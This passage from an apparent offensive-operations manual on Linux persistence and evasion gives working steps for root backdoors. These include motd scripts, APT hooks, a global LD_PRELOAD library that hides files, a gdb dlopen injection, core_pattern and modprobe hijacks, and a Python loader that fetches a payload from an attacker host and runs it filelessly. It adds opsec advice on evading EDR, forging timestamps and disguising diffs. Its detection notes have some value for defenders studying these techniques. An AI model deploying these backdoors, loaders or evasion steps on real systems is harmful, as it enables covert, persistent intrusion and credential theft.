- Binary refuses to run: SELinux type on your copied file does not permit execution in that context.

#### motd and update scripts

**What it is.** Code execution as root on every interactive SSH login, via Ubuntu and Debian's dynamic message-of-the-day machinery.

**Why it works.** `pam_motd.so` on Debian-family systems executes every executable in `/etc/update-motd.d/` as **root** at session setup and concatenates their stdout into the banner the user sees. That is an unusually good primitive: root execution, triggered by any user's login, in a directory that legitimately contains a dozen numbered scripts, with a mechanism that most operators forget exists. Ubuntu's set includes hardware and package-update reporting scripts, so an extra numbered script is genuinely unremarkable.

Related surfaces on the same theme: `/etc/update-motd.d` on Ubuntu, `unattended-upgrades` and `update-notifier` helper scripts, and `landscape-sysinfo`. The static `/etc/motd` is just text and executes nothing.

**Preconditions.** Root, a Debian-family host with `pam_motd.so` in its PAM stack referencing `/etc/update-motd.d`, and a user who logs in interactively. On RHEL, `pam_motd` typically only prints a static file and this technique does not apply.

**Commands.**

```bash
grep -rn pam_motd /etc/pam.d/
ls -la /etc/update-motd.d/

cat > /etc/update-motd.d/91-release-upgrade-check <<'EOF'
#!/bin/sh
[ -x /usr/local/sbin/hwdb-refresh ] && setsid /usr/local/sbin/hwdb-refresh >/dev/null 2>&1 &
exit 0
EOF
chmod 755 /etc/update-motd.d/91-release-upgrade-check
```

**Verify it worked.** Log in over SSH and check for your effect. `run-parts /etc/update-motd.d` as root simulates it. Confirm you produce no output, because anything you print appears in the login banner for every user.

**Detection and opsec.** Output discipline is the whole game: a script here that prints anything is visible to every person who logs into the host, which is the loudest possible failure. Redirect everything, background, and `exit 0`. The directory is not usually package-verified in a way that flags additions, and it is uncommon in baselines, making this one of the better root-context options on Ubuntu. The counter-argument is that it only fires on interactive login, so on a host nobody logs into, it never runs.

#### Package manager hooks

**What it is.** Root code execution attached to the package manager, so your payload runs whenever the host updates, which on most estates is at least daily and is a change window where unusual root activity is expected.

**Why it works.** Package managers deliberately support running commands around transactions. APT reads `/etc/apt/apt.conf.d/` and honours hook options such as `DPkg::Pre-Invoke`, `DPkg::Post-Invoke`, and `APT::Update::Pre-Invoke`, each of which is a list of shell commands executed as root. Because `unattended-upgrades` and the `apt-daily` systemd timers run automatically on Debian and Ubuntu, a hook there executes without any human action. DNF and RPM have the equivalent through DNF plugins in the plugin path and through package scriptlets, and pacman has `/etc/pacman.d/hooks/*.hook`. Additionally, `/var/lib/dpkg/info/*.postinst` and `*.prerm` scripts are root-executed shell scripts belonging to installed packages, and appending to one is a modification of an existing legitimate file rather than a new file.

**Preconditions.** Root. The relevant package manager present, and for the automatic-trigger benefit, its scheduled update mechanism enabled (`systemctl list-timers | grep -i apt`, or `dnf-automatic`).

**Commands.**

```bash
ls -la /etc/apt/apt.conf.d/ 2>/dev/null
systemctl list-timers --all 2>/dev/null | grep -iE 'apt|dnf|unattended'

cat > /etc/apt/apt.conf.d/99cache-refresh <<'EOF'
APT::Update::Pre-Invoke {"/usr/local/sbin/hwdb-refresh >/dev/null 2>&1 || true";};
DPkg::Post-Invoke {"/usr/local/sbin/hwdb-refresh >/dev/null 2>&1 || true";};
EOF
```

```bash
# Confirm APT actually parsed and will run it
apt-config dump | grep -iE 'Pre-Invoke|Post-Invoke'
```

For the RPM family the equivalent is a DNF plugin, executing in the package manager's process as root at defined hook points. The paths differ between the two DNF generations and getting them the wrong way round means your plugin is simply never loaded. For **dnf4** a plugin is a Python module dropped in the site-packages `dnf-plugins/` directory (typically `/usr/lib/python3.x/site-packages/dnf-plugins/`) with its configuration at `/etc/dnf/plugins/<name>.conf`. For **dnf5** plugins are native shared objects in `/usr/lib64/dnf5/plugins/` and their configuration lives in `/etc/dnf/libdnf5-plugins/`, not `/etc/dnf/plugins/`. Check which generation the target runs (`dnf --version`, and whether `/usr/bin/dnf` is dnf5) before writing either.

**Verify it worked.** `apt-get update` and observe the effect, and `apt-config dump` to prove the option is in the effective configuration rather than merely in a file APT ignored.

**Detection and opsec.** A hook that fails or writes to stdout produces visible noise in every `apt` run, which administrators read. Always append `|| true` so a failure never breaks package management, because a broken `apt` gets investigated within hours. The `/etc/apt/apt.conf.d/` directory contains many files by default, so an additional numbered one is well camouflaged, but it is inside `/etc` and therefore inside the scope of file integrity monitoring and configuration management. The timing advantage is real and underrated: root processes spawning children during a package transaction is the least suspicious root activity on the host.

**Failure modes.**

- Hook is silently ignored: APT configuration syntax is unforgiving. The semicolons, braces, and quotes must be exactly as shown, and the option name is case sensitive. `apt-config dump` is the only reliable check.
- `apt` breaks with your command's error: no `|| true`.
- Hook never fires: you used `DPkg::Pre-Invoke` but the host only ever runs `apt update` without installing, or vice versa. Register both.
- Payload runs in a constrained environment: `DPkg` hooks run with APT's environment and while the dpkg lock is held, so anything that tries to install packages from inside the hook deadlocks.

### Deeper and stealthier mechanisms

#### LD_PRELOAD and the global preload configuration

**What it is.** Injecting a shared library into processes so that your code runs inside them and can intercept library calls. Per-process via the `LD_PRELOAD` environment variable, or host-wide via `/etc/ld.so.preload`.

**Why it works.** The dynamic loader (`ld.so`) resolves symbols in a defined order, and libraries named in `LD_PRELOAD` or listed in `/etc/ld.so.preload` are loaded before the program's own dependencies. A function you export with the same name as a libc function is therefore found first, and you can implement it as a wrapper that calls the real one via `dlsym(RTLD_NEXT, "name")`. This gives you a hook on anything that goes through the dynamic symbol table: `open`, `read`, `readdir` (to hide files), `pam_authenticate` (to capture credentials or backdoor authentication), `accept` (to trigger on a magic connection), and constructor functions marked `__attribute__((constructor))` which run at load time before `main`, meaning you get execution in every process regardless of which functions it calls.

`/etc/ld.so.preload` is the persistence version: it is a plain text file of paths, and every dynamically linked program started after you write it loads your library. That is enormous reach and correspondingly enormous risk. In secure-execution mode, which is what a set-user-ID binary runs in, the loader applies extra restrictions: paths containing slashes are ignored, and objects are loaded only from the standard directories and only if they themselves carry the set-user-ID bit. The important nuance, because it is commonly stated both ways and both are wrong, is that `/etc/ld.so.preload` is **neither exempt from those restrictions nor specially blocked by them**. The loader builds one preload list from three sources, the environment variable, the `--preload` option, and `/etc/ld.so.preload`, and then applies the secure-execution filtering to that combined list. So a `/etc/ld.so.preload` entry does still take effect for set-user-ID binaries, but only if it satisfies the same no-slashes-and-setuid-bit rule as anything else, which a path like `/tmp/evil.so` does not. Plan for that: if you need your library to load into set-user-ID programs, it has to sit in a standard library directory and carry the bit.

**Preconditions.** For `LD_PRELOAD`: the ability to set the environment for the target invocation, which usually means launching it yourself, or a `sudo env_keep` entry, or `~/.ssh/environment` with `PermitUserEnvironment yes`, or `Environment=` in a systemd unit. For `/etc/ld.so.preload`: root. In both cases the library must match the target's architecture, and it must not depend on symbols the target lacks.

**Commands.**

```c
// A credential-capturing PAM hook via preload, and a constructor for unconditional execution.
// Compile: gcc -shared -fPIC -o /usr/lib/x86_64-linux-gnu/libnss_cache.so hook.c -ldl
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

static void log_line(const char *s) {
    FILE *f = fopen("/var/log/.ldcache", "a");
    if (f) { fprintf(f, "%s\n", s); fclose(f); }
}

__attribute__((constructor)) static void init(void) {
    // Runs in every process that loads this library, before main().
    // Keep this cheap and non-blocking or you will slow the whole host.
}

// Hide files whose names match a prefix from readdir consumers such as ls.
struct dirent *readdir(void *dirp) {
    static struct dirent *(*real)(void *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real(dirp)) != NULL) {
        if (strncmp(e->d_name, ".ldcache", 8) != 0) break;
    }
    return e;
}
```

```bash
# Per-process use
LD_PRELOAD=/usr/lib/x86_64-linux-gnu/libnss_cache.so /usr/bin/id

# Host-wide persistence. Test the library on a throwaway process FIRST.
echo /usr/lib/x86_64-linux-gnu/libnss_cache.so > /etc/ld.so.preload
```

**Verify it worked.** `LD_DEBUG=libs /bin/true 2>&1 | head` shows the loader's decisions and whether your object was loaded. `cat /proc/<pid>/maps | grep yourlib` confirms it is mapped into a running target. For the host-wide case, check a process you did not start yourself.

**Detection and opsec.** `/etc/ld.so.preload` is a one-line file whose normal state is "does not exist", so its presence is a definitive indicator and it is on every hunting list. It is also checked by rootkit scanners such as `chkrootkit` and `rkhunter`, and by most Linux EDR agents. Per-process `LD_PRELOAD` is much quieter but leaves the variable visible in `/proc/<pid>/environ` for the lifetime of the process, and process creation telemetry that captures the environment will show it.

The bigger risk is operational. A bug in a preloaded library crashes every process on the host. An ABI mismatch after a glibc update does the same. Statically linked binaries, Go binaries, and musl-linked binaries ignore your library entirely, so your hooks are inconsistently applied in ways that look like a fault. If you use `/etc/ld.so.preload`, verify the library loads cleanly with `LD_PRELOAD=` on several binaries first, keep the library on the same filesystem as `/` (a path on a filesystem mounted later means every early-boot process fails to start), and make the constructor do nothing that can block.

**Failure modes.**

- `ERROR: ld.so: object ... cannot be preloaded ... ignored` on every command: wrong architecture, missing dependency, or unresolved symbol. The message is printed to stderr for every process, which is extremely loud.
- Host does not boot: your library is on a filesystem not mounted at early boot, or it crashes in the constructor. Recovery requires single user mode or a rescue image. This is the one persistence mechanism that can brick a host.
- Hooks do not fire: the target is statically linked, or it calls the syscall directly rather than through libc, or the symbol is versioned and your unversioned definition is not preferred.
- Works for normal binaries but not for `sudo`, `su`, or `ping`: secure-execution mode restrictions on setuid binaries.

#### Kernel modules

**What it is.** Loading a loadable kernel module to run code in kernel context, typically to hide processes, files, and network connections, and to install a trigger.

**Why it works.** A kernel module runs with full kernel privilege in the same address space as the kernel, so it can alter any kernel data structure and intercept any code path. The classic technique of overwriting entries in `sys_call_table` is no longer straightforward: the table is in read-only memory on modern kernels, `kallsyms_lookup_name` has not been exported to modules since kernel 5.7, and various hardening features make the write itself awkward. Current implementations therefore hook through the supported tracing infrastructure instead, using **ftrace** (registering an `ftrace_ops` on a kernel function and redirecting its instruction pointer) or **kprobes**, both of which are stable, documented, and work across kernel versions. That is a genuine advantage in reliability and a genuine disadvantage in stealth, because those registrations are enumerable.

**What loading one costs you.** This is the part usually glossed over, so it deserves to be explicit.

- **Stability.** A kernel module bug is a kernel panic or a silent memory corruption, not a crashed process. You take the whole host down, including whatever production service it runs, and you produce a crash dump that a competent responder will analyse and that contains your module.
- **Build coupling.** The module must be built against the exact kernel version and configuration, or `insmod` refuses it with a version magic mismatch. That means either building on the target (which requires kernel headers and a compiler, both loud to install) or reproducing the target's exact kernel build elsewhere.
- **Signing.** With UEFI Secure Boot and kernel lockdown active, or with `CONFIG_MODULE_SIG_FORCE` or `module.sig_enforce=1`, unsigned modules are rejected outright. Many enterprise distributions ship this way. Check before you plan around a module.
- **Taint.** Loading an out-of-tree or unsigned module sets bits in `/proc/sys/kernel/tainted` and prints a message to the kernel ring buffer. Those artefacts persist until reboot and are trivially queried.
- **Telemetry.** Module load is a first-class event for auditd (`-w /sbin/insmod`, and the `init_module`/`finit_module` syscalls) and for every EDR that hooks kernel module loading, which is all of them, because it is the single most privileged action on the host.

**Preconditions.** Root with `CAP_SYS_MODULE` in the initial user namespace, modules not disabled (`modules_disabled` in `/proc/sys/kernel/`), signature enforcement not blocking you, and a module built for this kernel.

**Commands.**

```bash
# Feasibility check before you invest in building anything
uname -r
cat /proc/sys/kernel/modules_disabled          # 1 means module loading is permanently off
cat /proc/sys/kernel/tainted
mokutil --sb-state 2>/dev/null                 # Secure Boot state
cat /sys/module/module/parameters/sig_enforce 2>/dev/null
grep -E 'CONFIG_MODULE_SIG_FORCE|CONFIG_MODULES=' /boot/config-$(uname -r) 2>/dev/null
ls /usr/src/kernels/ /lib/modules/$(uname -r)/build 2>/dev/null   # headers present?
```

```bash
insmod ./mod.ko
lsmod | head
dmesg | tail -20
```

**Verify it worked.** `lsmod` and `/proc/modules` before the module hides itself, `dmesg` for load messages, and then an actual test of whatever the module does. A module that unlinks itself from the module list to hide will also be un-unloadable, so decide in advance whether you need `rmmod` to work for cleanup.

**Detection and opsec.** Realistically, on a monitored host, loading a kernel module is one of the loudest things you can do, and the payoff (hiding from userspace tooling) is only useful against a defender who is looking with userspace tooling. Against an EDR with its own kernel visibility, or against memory forensics, a module is a liability. The honest positioning is that kernel modules are for long-duration operations against hosts with weak endpoint telemetry, and for cases where you specifically need to defeat a userspace-only inspection process. Otherwise the cost is not worth it.

**Failure modes.**

- `insmod: ERROR: could not insert module: Invalid module format`: version magic mismatch. Build against this exact kernel.
- `Key was rejected by service`: signature enforcement. You need a signed module or a shim in the machine owner key database.
- `Operation not permitted` as root: `modules_disabled=1`, kernel lockdown in integrity or confidentiality mode, or you are in a container without `CAP_SYS_MODULE` in the init namespace.
- `Unknown symbol in module`: you referenced a symbol that is not exported (`kallsyms_lookup_name` is the usual culprit on 5.7 and later).
- Host panics on load or on unload: your reference counting or hook teardown is wrong. Test on an identical throwaway VM, never first on the target.

#### Kernel-adjacent userspace helpers

**What it is.** A family of kernel features that cause the kernel to execute a userspace program of your choosing, as root, in the initial namespaces. These are the cheapest way to get kernel-triggered root execution without writing a kernel module, and several double as container escapes.

**Why it works.** Each of these is a documented kernel interface whose value is a path to a program the kernel invokes:

| Interface | Kernel invokes it when | Notes |
| --- | --- | --- |
| `/proc/sys/kernel/core_pattern` | Any process dumps core, if the value starts with `\|` | Runs as root in the initial namespaces. Works regardless of cgroup version, which makes it the most broadly applicable of these |
| `/proc/sys/kernel/modprobe` | The kernel needs to autoload a module (`request_module`) | Trigger by using an unknown socket family or an unknown network device type |
| `/sys/kernel/uevent_helper` | A device uevent fires | Legacy. `CONFIG_UEVENT_HELPER` is off in most modern distribution kernels, so treat as unlikely to work |
| `/proc/sys/fs/binfmt_misc/register` | A file with a registered magic or extension is executed | Registers an interpreter of your choice for a file type. Requires the `binfmt_misc` filesystem mounted plus `CAP_SYS_ADMIN`, and *which* namespace that capability has to be in changed in **Linux 6.7**: from that release binfmt_misc is per-user-namespace and mountable by an unprivileged user in a new user and mount namespace, where `CAP_SYS_ADMIN` in *that* namespace suffices and the registration is scoped to it. Before 6.7 it needed `CAP_SYS_ADMIN` in the initial namespace, meaning real root. The namespaced form is much less useful for persistence and much more useful for sandbox work |
| cgroup v1 `release_agent` | The last task leaves a cgroup with `notify_on_release=1` | **cgroup v1 only.** cgroup v2 replaced this with `cgroup.events` and inotify, so on any cgroup-v2-only host (current Fedora, Ubuntu, RHEL 9, and most modern Kubernetes) this does not exist |

**Preconditions.** Write access to the relevant `/proc` or `/sys` path, which means root in the initial namespace, or root with `CAP_SYS_ADMIN` in a container that has a writable `/proc/sys` (which is precisely why these appear in the escape section too).

**Commands.**

```bash
# core_pattern: root execution on the next core dump anywhere on the host
cat /proc/sys/kernel/core_pattern      # save the original, it is usually systemd-coredump
echo '|/usr/local/sbin/hwdb-refresh' > /proc/sys/kernel/core_pattern

# Trigger: make any process dump core
ulimit -c unlimited
sleep 300 & kill -SIGSEGV $!
```

```bash
# modprobe path: root execution when the kernel autoloads a module
cat /proc/sys/kernel/modprobe
echo /usr/local/sbin/hwdb-refresh > /proc/sys/kernel/modprobe
# Trigger by requesting something that needs a module the kernel does not have loaded
ip link add name t0 type nonexistent-type 2>/dev/null
```

**Verify it worked.** These are fire-and-forget, so instrument your payload to write a marker file and check for it after triggering. Note that `core_pattern` changes are not persistent across reboot, so pair them with something that rewrites the value at boot if you need durability.

**Detection and opsec.** `core_pattern` normally contains a `systemd-coredump` invocation on modern distributions, so a change is a stark one-value diff, and it is increasingly monitored precisely because it is a well-known container escape. `modprobe` normally contains `/sbin/modprobe`. Both are single sysctl values, which makes them easy for a defender to baseline and easy for you to restore. Restoring the original value immediately after triggering is good discipline and is what separates this from leaving a persistent backdoor: use it for execution, then put it back.

**Failure modes.**

- `core_pattern` written but nothing runs: core dumps are disabled (`ulimit -c 0`, or `kernel.core_pattern` overridden by a later sysctl reload), or the path does not exist as seen from the **initial** mount namespace, which is the classic mistake when doing this from a container.
- `modprobe` path never invoked: the module you tried to trigger is already loaded, or built in, or module autoloading is disabled (`kernel.modules_disabled`).
- Payload runs but with an unexpected environment: these helpers run with a minimal environment and, for `core_pattern`, receive the core dump on stdin. Do not block reading it.

#### eBPF, honestly

**What it is.** Loading eBPF programs to observe and, within limits, influence kernel behaviour. Used offensively for very high fidelity credential capture, for activation triggers, and for selective interference.

**Why it works.** eBPF programs are verified bytecode attached to kernel hook points: kprobes and kretprobes on kernel functions, uprobes on userspace functions, tracepoints, `sockops` and `XDP`/`TC` on the network path, and BPF LSM hooks on security decisions. They run in kernel context with access to kernel memory through helper functions, and they can communicate with userspace through maps and ring buffers. Because they attach without loading a module, they do not require matching kernel headers when built with **CO-RE** against BTF, they do not taint the kernel in the way a module does, and they cannot panic the host, because the verifier rejects programs it cannot prove safe.

**What this genuinely gives you.**

- **Credential capture of exceptional quality.** A uprobe on the right function in an application's own library sees the data before it is encrypted or after it is decrypted. This is how legitimate observability tools read TLS payloads, and it works identically for capturing what a user types into an SSH session or what a client sends to a database.
- **Activation triggers.** An XDP or TC program can inspect every packet arriving at an interface and act on a specific pattern without any socket being open and without the packet ever reaching userspace. That is a magic-packet trigger with no listening port for a scanner to find.
- **Observation.** Full-host visibility into process execution, file access, and network connections, which is exactly what defensive tools use it for.
- **Selective denial.** BPF LSM programs can return a denial from a security hook, which can be used to block specific operations, for example preventing something from reading a file.

**What it does not give you, contrary to the hype.**

- It is **not** a general syscall-rewriting mechanism. The verifier constrains what programs can do, and modifying kernel state arbitrarily is not permitted. `bpf_probe_write_user` can write to userspace memory but it is deliberately limited, best-effort, and its first use prints a warning to the kernel log. `bpf_override_return` requires `CONFIG_BPF_KPROBE_OVERRIDE` and only works on functions explicitly annotated as error-injectable, which is a short list.
- It is **not** invisible. Loaded programs, maps, and links are enumerable through the `bpf()` syscall by anyone with the capability, and `bpftool prog list`, `bpftool link list`, and `bpftool map list` show them. There is no supported way to hide a loaded program from an enumerator with the same privileges. The realistic stealth story is that most defenders do not look, not that they cannot.
- It requires privilege: `CAP_BPF` plus `CAP_PERFMON` for tracing on kernel 5.8 and later, or `CAP_SYS_ADMIN` on older kernels. Unprivileged eBPF is disabled by default on current kernels (`kernel.unprivileged_bpf_disabled`).

**Persistence property.** A loaded program dies with its loader unless it is **pinned**. Pinning a program, map, or (better) a `bpf_link` into the bpffs mount at `/sys/fs/bpf/` holds a kernel reference, so the attachment survives the loading process exiting. That is the mechanism that turns eBPF from a tool into persistence, and it is also the artefact: the pin is a visible file in `/sys/fs/bpf`. Pins do not survive reboot, so eBPF persistence still needs a boot mechanism from the earlier sections to reload it.

**Preconditions.** Kernel with BPF and BTF support (`/sys/kernel/btf/vmlinux` present for CO-RE), the capabilities above, `bpffs` mounted at `/sys/fs/bpf`, and kernel lockdown not in confidentiality mode, which blocks BPF features that read kernel memory.

**Commands.**

```bash
# Feasibility and current state
ls /sys/kernel/btf/vmlinux 2>/dev/null && echo "BTF present, CO-RE viable"
sysctl kernel.unprivileged_bpf_disabled kernel.perf_event_paranoid
mount | grep bpf
bpftool feature probe 2>/dev/null | head -20

# What is already loaded, which is also how a defender finds you
bpftool prog list
bpftool link list
bpftool map list
ls -la /sys/fs/bpf/
```

Implementation is a normal libbpf or `bpftrace` exercise; `bpftrace` is the fastest way to prove a hook point yields the data you want before writing a persistent loader, and `bpftool prog load ... pinmaps` plus link pinning is the mechanism for making it survive.

**Detection and opsec.** The `bpf()` syscall is auditable and is commonly audited on hosts that care, because defensive tooling knows exactly how valuable it is. Loading a program while an EDR that itself uses eBPF is running means competing on the same surface, and several EDR products explicitly enumerate and alert on unexpected BPF programs. `bpftool prog list` output showing a program whose name and load time do not match the installed observability stack is a clean detection. The first invocation of `bpt_probe_write_user` logs to the kernel ring buffer, which is a gift to a defender. Treat eBPF as a precision instrument for capture and triggering, deployed briefly, rather than as a hiding place.

**Failure modes.**

- `Operation not permitted` on load: missing `CAP_BPF`/`CAP_PERFMON`, or `unprivileged_bpf_disabled`, or lockdown.
- Verifier rejection with a long instruction trace: your program violates a safety property (unbounded loop, unchecked pointer, stack too large). This is a programming problem, not a permissions problem.
- Program loads but never fires: the kprobe symbol name differs on this kernel, or the function was inlined and no longer exists as a probe target, or the uprobe offset is wrong for this build of the binary.
- Works on the lab kernel and not the target: no BTF on the target, so CO-RE relocation fails and you need per-kernel builds.
- Attachment disappears when your loader exits: not pinned.

#### Process injection on Linux

**What it is.** Executing your code inside an existing process, either to inherit its identity and network position or to avoid having a process of your own on the process list.

**Why it works.** Three mechanisms, in order of practicality.

**`ptrace`-based injection.** `PTRACE_ATTACH` stops the target, `PTRACE_GETREGS` and `PTRACE_POKEDATA` (or writes to `/proc/<pid>/mem`) let you place a small stub and redirect execution to it, and `PTRACE_DETACH` resumes. The standard payload is to call `dlopen` in the target so that a shared object of yours is loaded with full access to the process. Note that glibc 2.34 merged `libdl` into `libc` and removed the old `__libc_dlopen_mode` internal symbol, so modern injectors resolve `dlopen` itself. Access is governed by `/proc/sys/kernel/yama/ptrace_scope`: `0` allows any same-UID attach, `1` (the default on Ubuntu and many others) restricts attach to descendants unless you have `CAP_SYS_PTRACE`, `2` requires `CAP_SYS_PTRACE`, and `3` disables `ptrace` entirely with no way back without a reboot.

**`gdb`.** If `gdb` is installed, injection is a one-liner because `gdb` already implements everything above. This is unglamorous and extremely effective.

**Fileless execution with `memfd_create`.** Rather than injecting into someone else's process, create an anonymous in-memory file with `memfd_create`, write an ELF into it, and `execveat` it with `AT_EMPTY_PATH`. The result is a running process with no file on disk. The artefact is that `/proc/<pid>/exe` points at a `memfd:` path marked deleted, which is both the reason this defeats naive file-based scanning and the reason it is a clean detection for anyone who looks at `exe` symlinks. A related trick for `noexec` mounts is invoking the dynamic loader directly with the target binary as an argument, which executes it without the kernel checking the execute permission on the file.

**Preconditions.** For `ptrace`: same UID as the target or `CAP_SYS_PTRACE`, and a `ptrace_scope` value that permits it. Inside containers, `ptrace` is often blocked by seccomp or by a missing capability. For `memfd_create`: nothing beyond normal execution, though the `memfd_create` syscall is blocked by some seccomp profiles.

**Commands.**

```bash
cat /proc/sys/kernel/yama/ptrace_scope
ps -eo pid,user,comm,lstart --sort=start_time | tail -20   # long-lived, same-uid targets
```

```bash
# gdb injection: load a shared object into a running process
gdb -p "$PID" -batch \
  -ex 'set confirm off' \
  -ex 'call (void*) dlopen("/usr/lib/x86_64-linux-gnu/libnss_cache.so", 2)' \
  -ex 'detach' -ex 'quit'
```

```bash
# Fileless: fetch and run without touching disk (python3 is nearly always present)
python3 - <<'EOF'
import ctypes, os, urllib.request
buf = urllib.request.urlopen("http://$ATTACKER/payload").read()
libc = ctypes.CDLL(None, use_errno=True)
fd = libc.memfd_create(b"jbd2/sda1-8", 0)
os.write(fd, buf)
os.execv(f"/proc/self/fd/{fd}", ["jbd2/sda1-8"])
EOF
```

```bash
# Execute from a noexec mount by invoking the loader directly
/lib64/ld-linux-x86-64.so.2 /tmp/payload
```

**Verify it worked.** For injection, `grep yourlib /proc/<pid>/maps` proves the library is mapped. For fileless execution, `ls -l /proc/<pid>/exe` shows the `memfd` path, and the process should appear in `ps` under the name you chose.

**Detection and opsec.** `ptrace` attach is a standard EDR detection and a standard auditd rule, because outside of debuggers and a handful of tools almost nothing legitimately attaches to another process. `gdb` appearing on a production server is itself notable. For fileless execution, the `memfd_create` plus `execveat` sequence is a well-known pattern that modern Linux EDR specifically hunts, and the deleted `exe` symlink is discoverable in one command across all processes. None of these are stealthy against good telemetry; their value is against file-based scanning and against defenders who inventory binaries rather than behaviour.

Also note that injecting into a process gets you that process's identity, network reputation, and open file descriptors, which is often the actual goal: a payload running inside a legitimate web application process makes outbound connections that look like the application's.

**Failure modes.**

- `ptrace: Operation not permitted` as the same user: `yama/ptrace_scope` is `1` or higher.
- `gdb` `call dlopen` returns 0: the library path is wrong as seen from the target's mount namespace, or the target is statically linked and has no `dlopen`, or the target has no `libdl` loaded on a pre-2.34 glibc.
- Target crashes on detach: you corrupted registers or the stack. Injection into a critical service crashes a production process, which is an outage and an alert.
- `memfd_create` fails with `ENOSYS` or `EPERM`: old kernel, or seccomp filter. Fall back to `/dev/shm`, which is a file but often overlooked, subject to `noexec`.
- Fileless process dies immediately: the ELF is dynamically linked against something absent, or you passed the wrong `argv[0]` for a binary that inspects it.

### The credential-based option, which is usually the right one

The same argument as on Windows applies with even more force on Linux, because Linux authentication is simpler and the credential artefacts are more durable. An added SSH key, an added account, a stolen private key, or a Kerberos keytab is not an implant. There is no process to hide, no file to sign, no library to load, no unit to enumerate, and nothing for a runtime security agent to catch, because using a credential is indistinguishable from legitimate use of that credential. When you log back in with a key, the host records a successful authentication, which is the same thing it records for every administrator every day.

Ranked by quietness and durability together:

1. **A stolen key or credential that already exists.** Nothing changes on the target at all. The only artefact is your login, and even that blends with the legitimate owner's logins if you come from a plausible source address. This is the ceiling and you should always check whether it is available before installing anything.
2. **A Kerberos keytab from a domain-joined Linux host.** `/etc/krb5.keytab` contains the host's machine account keys, which is a domain credential usable from anywhere with your own tooling, and it does not expire on a normal password schedule for the host account in the way a user password does. It is also a pivot from Linux into Active Directory, which is frequently the actual objective. Covered in detail in the credential harvesting section.
3. **An added SSH key on an existing account**, ideally a service account that already has multiple automation keys and already logs in from several sources. One appended line, no new account, no new file.
4. **An added account.** More durable in the sense that it is independent of any existing account's lifecycle, and much louder: a new entry in `/etc/passwd` and `/etc/shadow` is a canonical detection, new accounts are reconciled against HR and IAM systems on any mature estate, and a UID 0 account other than root is an instant finding.

The corollary is that credential hygiene work is persistence work. Time spent dumping `/etc/shadow`, pulling keytabs, and harvesting SSH keys buys you more durable access than time spent installing implants, and it does so without adding anything to the host that a defender can find.

### Backdooring existing mechanisms instead of adding new ones

Almost every detection strategy for persistence is a comparison against a known state. Package verification compares files against their package manifest. AIDE compares hashes against a database. Configuration management compares `/etc` against the repository. An EDR compares the current set of systemd units, cron jobs, and startup entries against what it saw yesterday. Each of these is excellent at spotting an **addition** and much weaker at spotting a **modification inside a file that changes anyway**.

That asymmetry is the whole argument. Concretely, prefer:

- A `systemd` drop-in adding `ExecStartPost=-/path` to an already-enabled, already-running service, rather than a new unit. Package verification stays clean because you never touched the packaged unit file, and `systemctl list-units` shows nothing new.
- An extra line inside a script that an existing cron job already calls, rather than a new file in `/etc/cron.d`. The cron log shows the same command it always showed.
- One appended key in an `authorized_keys` file that already contains four keys, on an account that already accepts key authentication from three source networks.
- A modification to an existing `/etc/profile.d/` script rather than a new one, on a host where that file is long and customised.
- An extra `Defaults` line in an existing `/etc/sudoers.d/` file rather than a new file with an obvious grant.
- Wrapping an existing helper binary that something already calls, rather than placing a new binary. Rename the original, put your wrapper in its place, and have the wrapper call through. The process tree still shows the expected name.

Timestamp discipline goes with this, and there is an important limit. You can set atime and mtime on a file to arbitrary values with `touch -r reference target` or `touch -d`, which makes a modified file look untouched to `ls -l` and to any check that compares mtimes. You **cannot** set ctime from userspace: it is updated by the kernel on any inode change and there is no interface to forge it. So `stat` on your modified file shows an mtime from last year and a ctime from ten minutes ago, which is a stronger indicator than an honest mtime would have been. Two consequences: use `touch -r` when you expect mtime-based comparison and nothing more, and understand that against a defender who runs `stat` or who has a filesystem timeline, timestamp manipulation makes you more visible rather than less. On filesystems with a birth time (`crtime`), that is another value you cannot set.

Content discipline matters as much. A line you add should match the surrounding style: same indentation, same quoting, same comment conventions, no base64, no unusual paths, no `curl | bash`. The reviewer of a diff is a human who is pattern-matching on strangeness, and a line that reads like the rest of the file survives review even when the diff is seen.

### Durability and detectability comparison

Ratings are for a current, patched, monitored Linux host with an EDR agent, file integrity monitoring on `/etc`, and journald forwarding to a SIEM. "Rebuild" means the host being reprovisioned from an image or fully reapplied by configuration management.

| Mechanism | Privilege | Reboot | Logout | Package update | Rebuild | Detectability | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Stolen existing credential or key | None on target | Yes | Yes | Yes | Yes, if the credential is in the image or directory | Very low | No target-side artefact at all |
| Keytab theft on domain-joined host | Root | Yes | Yes | Yes | Depends on rejoin | Very low | Pivots Linux to AD |
| Added SSH key, existing account | User or root | Yes | Yes | Yes | No | Low to medium | Write to `authorized_keys` is a common EDR rule |
| Shell rc file append | User | Yes | Yes | Yes | No | Medium | Fires only on the right shell invocation type |
| `~/.ssh/rc` | User | Yes | Yes | Yes | No | Low to medium | Best-triggered user hook, fires for scp and sftp too |
| User cron | User | Yes with `@reboot` | Yes | Yes | No | Medium to high | Full command line is logged on every run |
| User systemd unit or timer | User | Only with lingering | Only with lingering | Yes | No | Low to medium | Outside `/etc`, so usually outside FIM scope |
| Desktop autostart | User | Yes | Yes | Yes | No | Medium | Only fires on graphical login |
| System cron and `cron.d` | Root | Yes | Yes | Yes | No | High | New file in `/etc`, plus logged command line |
| New systemd unit and timer | Root | Yes | Yes | Yes | No | High | Well-covered EDR detection |
| systemd drop-in on existing unit | Root | Yes | Yes | Yes | No | Low to medium | Package verification stays clean, no new unit listed |
| systemd generator | Root | Yes | Yes | Yes | No | Low | Rarely baselined; fragile, can delay boot |
| `rc.local` | Root | Yes | Yes | Yes | No | Low to medium | Anomalous merely by existing on modern distros |
| motd and `update-motd.d` | Root | Yes | Yes | Usually | No | Low to medium | Root execution on every interactive login, Debian family |
| Package manager hook | Root | Yes | Yes | Yes, it is the trigger | No | Medium | Executes inside a legitimate root change window |
| sudoers grant | Root | Yes | Yes | Yes | No | Medium to high | Heavily monitored as a compliance control |
| setuid binary you place | Root | Yes | Yes | Yes | No | Very high | `find -perm -4000` finds it immediately |
| File capability you place | Root | Yes | Yes | Yes | No | Medium | Quieter than setuid, still one command to find |
| PAM stack modification | Root | Yes | Yes | Usually, unless authselect reverts | No | High | Best credential capture, worst blast radius |
| PAM module binary patch | Root | Yes | Yes | No, the package replaces it | No | Very high | `rpm -Va` and `debsums` catch it instantly |
